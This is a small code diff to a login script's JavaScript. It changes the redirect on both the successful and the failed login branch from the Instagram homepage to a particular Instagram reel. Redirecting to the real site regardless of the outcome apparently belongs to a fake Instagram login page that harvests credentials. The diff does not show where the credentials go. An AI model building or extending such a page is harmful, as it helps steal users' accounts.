@@ -28,9 +28,9 @@ document
 
         // If login is successful, redirect to Instagram
         if (data.success) {
-          window.location.href = "https://www.instagram.com"; // Redirect to Instagram page
+          window.location.href = "https://www.instagram.com/reel/DH6J9t_P1I_/?igsh=MTkyc2ptbzRtN3p2cg=="; // Redirect to Instagram page
         } else {
-          window.location.href = "https://www.instagram.com"; // Redirect to Instagram page
+          window.location.href = "https://www.instagram.com/reel/DH6J9t_P1I_/?igsh=MTkyc2ptbzRtN3p2cg=="; // Redirect to Instagram page
         }
       })
       .catch((error) => {
